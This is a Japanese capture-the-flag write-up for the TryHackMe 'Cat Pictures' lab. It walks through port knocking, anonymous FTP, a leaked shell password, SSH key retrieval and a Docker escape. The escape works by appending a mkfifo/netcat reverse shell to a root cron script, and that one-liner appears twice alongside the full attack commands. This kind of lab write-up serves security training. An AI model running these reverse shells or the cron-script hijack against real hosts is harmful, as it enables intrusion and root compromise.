# Cat Pictures
- https://tryhackme.com/room/catpictures
- I made a forum where you can post cute cat pictures!

# 攻撃シナリオ
1. ポートスキャン
1. webサイトを探索し、掲示板で情報を取得
1. ポートノッキングを行い、ポートを開ける
1. ftp接続を行い、ファイルを取得
1. ファイルに記載されたポート+パスワードでアクセスするとリモートアクセス 
1. 怪しいファイルが見つかるも、"Regular shell"で実行しろといわれるので、リバースシェルでリモートアクセスしなおす
1. 怪しいファイルを実行するとパスワードを聞かれるので、ファイルを解析
1. 実行するとSSHの秘密鍵を入手できるのでそれを使ってリモート接続+フラグ取得
1. linpeasを使って情報収集するとDocker上にいること＋Docker上で実行されていないバッチが見つかる
1. バッチをリバースシェルのスクリプトに書き換え、Dockerのホストにリモートアクセス+フラグ取得

# ポートスキャン
```
└─# nmap -sV -sC -T4 -p- -oN cat/cat_nmap thm_target
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 19:55 JST
Nmap scan report for thm_target (10.10.169.95)
Host is up (0.26s latency).
Not shown: 65530 closed ports
PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
2375/tcp filtered docker
4420/tcp open     nvm-express?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
```

# webサイトを探索し、掲示板で情報を取得

- http://thm_target:8080/viewtopic.php?f=2&t=2
- 下記のような投稿があるため、ポートノッキングを示唆

```
POST ALL YOUR CAT PICTURES HERE :)

Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

# ポートノッキングを行い、ポートを開ける
- knockコマンドで実行し、しばらくするとポートが開く

```
┌──(root💀kali)-[~]
└─# knock thm_target 1111 2222 3333 4444
                                                                 
┌──(root💀kali)-[~]
└─# nmap -p21 thm_target                
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 20:00 JST
Nmap scan report for thm_target (10.10.169.95)
Host is up (0.26s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds

```

# ftp接続を行い、ファイルを取得
- ftpコマンドでanonymousで入り、ファイルを取得
- internal shellへのアクセス方法が得られる

```
└─# ftp thm_target
Connected to thm_target.
220 (vsFTPd 3.0.3)
Name (thm_target:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
mget note.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (162 bytes).
226 Transfer complete.
162 bytes received in 0.00 secs (150.8133 kB/s)
ftp> exit
221 Goodbye.
                                                                 
┌──(root💀kali)-[~]
└─# cat note.txt        
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover

```

# ファイルに記載されたポート+パスワードでアクセスするとリモートアクセス 

```
└─# nc thm_target 4420    
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
sardinethecat
Password accepted
ls
bin
etc
home
lib
lib64
opt
tmp
usr

```

# 怪しいファイルが見つかるも、"Regular shell"で実行しろといわれるので、リバースシェルでリモートアクセスしなおす

- 使えるコマンドが限定されている
```
ls -al bin
total 1520
drwxrwxr-x  2 1001 1001    4096 Apr  2 23:05 .
drwxr-xr-x 10 1001 1001    4096 Apr  3 01:30 ..
-rwxr-xr-x  1 1001 1001 1113504 Apr  1 20:32 bash
-rwxr-xr-x  1    0    0   35064 Apr  1 20:32 cat
-rwxr-xr-x  1    0    0   35000 Apr  1 20:32 echo
-rwxr-xr-x  1    0    0  133792 Apr  1 20:32 ls
-rwxr-xr-x  1    0    0   35312 Apr  2 23:05 nc
-rwxr-xr-x  1    0    0   63704 Apr  1 20:32 rm
-rwxr-xr-x  1    0    0  121432 Apr  1 20:37 sh

ls -al usr/bin
total 648
drwxr-xr-x 2 0 0   4096 Apr  3 01:31 .
drwxr-xr-x 4 0 0   4096 Apr  2 22:43 ..
-rwxr-xr-x 1 0 0  63672 Apr  3 01:20 mkfifo
-rwxr-xr-x 1 0 0  88280 Apr  3 01:31 touch
-rwxr-xr-x 1 0 0 499264 Apr  2 22:43 wget
ls -al usr/lib

```

- catloverのhomeディレクトリにrunmeという実行ファイルがある
- このサービス上で実行すると、普通のshellで動かせと怒られる

```
ls home
catlover

ls home/catlover
runme


home/catlover/runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
```

# 怪しいファイルを実行するとパスワードを聞かれるので、ファイルを解析
- 使えるコマンドを確認し、リバースシェルで入りなおする
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.95 1234 >/tmp/f
```
- 攻撃端末側
```
└─# nc -lnvp 1234         
listening on [any] 1234 ...
connect to [10.9.1.95] from (UNKNOWN) [10.10.169.95] 58556
/bin/sh: 0: can't access tty; job control turned off

```
- 実行するとパスワードを聞かれる
- catコマンドで中身を見ると、パスワードプロンプトの前に、パスワードぽいものを確認
```
# ./runme
Please enter yout password: aaaa
Access Denied

# cat runme
略
f.������H�H��rebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd
       ������������������������0���|c����|��������XH�������zRx
                                                             0��
略
```

# 実行するとSSHの秘密鍵を入手できるのでそれを使ってリモート接続+フラグ取得
```
# ./runme
Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued! 
# ls -al
total 28
drwxr-xr-x 2 0 0  4096 Apr  3 01:34 .
drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
# ls -al
total 32
drwxr-xr-x 2 0 0  4096 Aug 14 11:06 .
drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
-rw-r--r-- 1 0 0  1675 Aug 14 11:06 id_rsa
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
# cat id_rsa
```

```
─# vi id_rsa    
                                                                 
┌──(root💀kali)-[~/cat]
└─# chmod 600 id_rsa
                                                                 
┌──(root💀kali)-[~/cat]
└─# ssh -i id_rsa catlover@thm_target

```
- whoamiだとrootとあるが、rootとしてフラグを入れるとエラーになる
- どうやら真のrootではない模様　roomのタグから多分dockerにいると推測
```
root@7546fa2336d6:/# whoami
root
root@7546fa2336d6:/# cd /root    
root@7546fa2336d6:/root# ls
flag.txt
```

# linpeasを使って情報収集するとDocker上にいること＋Docker上で実行されていないバッチが見つかる

- /opt/cleanという固有のディレクトリがある
```
[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                   
overlay          20G  7.3G   12G  40% /
tmpfs            64M     0   64M   0% /dev
tmpfs           238M     0  238M   0% /sys/fs/cgroup
shm              64M     0   64M   0% /dev/shm
/dev/xvda1       20G  7.3G   12G  40% /opt/clean
tmpfs           238M     0  238M   0% /proc/acpi
tmpfs           238M     0  238M   0% /proc/scsi
tmpfs           238M     0  238M   0% /sys/firmware
              total        used        free      shared  buff/cache   available
Mem:         486564      341368       21048       28256      124148      105060
Swap:             0           0           0

```
- dockerにいることがわかる
```
[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                
 Not Found                                                                                   
[+] AppArmor enabled? .............. AppArmor Not Found
[+] grsecurity present? ............ grsecurity Not Found                                                          
[+] PaX bins present? .............. PaX Not Found                                                                 
[+] Execshield enabled? ............ Execshield Not Found                                                          
[+] SELinux enabled? ............... sestatus Not Found                                                            
[+] Is ASLR enabled? ............... Yes                                                                           
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes                                                                           
[+] Is this a container? ........... Looks like we're in a Docker container
[+] Any running containers? ........ No

```
- cleanディレクトリには/tmpを削除するバッチがおいてある

```
root@7546fa2336d6:/tmp# ls -al /opt/clean/
total 16
drwxr-xr-x 2 root root 4096 May  1 00:20 .
drwxrwxr-x 1 root root 4096 Mar 25 16:08 ..
-rw-r--r-- 1 root root   27 May  1 00:20 clean.sh
root@7546fa2336d6:/tmp# cat /opt/clean/clean.sh 
#!/bin/bash

rm -rf /tmp/*

```
- しかし、今いる/tmpディレクトリは削除されていない
- このことから、dockerのホスト側の/tmpディレクトリを定期的に削除するようなバッチであると推測
```
root@7546fa2336d6:/tmp# ls
linpeas.sh  out.txt

```


# バッチをリバースシェルのスクリプトに書き換え、Dockerのホストにリモートアクセス+フラグ取得

- リバースシェルを実行するスクリプトをclean.shに追記
```
root@7546fa2336d6:/tmp# echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.95 4321 >/tmp/f" >>/opt/clean/clean.sh
root@7546fa2336d6:/tmp# cat /opt/clean/clean.sh 
#!/bin/bash

rm -rf /tmp/*
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.95 4321 >/tmp/f
root@7546fa2336d6:/tmp# client_loop: send disconnect: Broken pipe
```

- しばらくするとシェルがつながってrootになれる
```
└─# nc -lnvp 4321         
listening on [any] 4321 ...
connect to [10.9.1.95] from (UNKNOWN) [10.10.169.95] 32808
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# ls     
firewall
root.txt

```
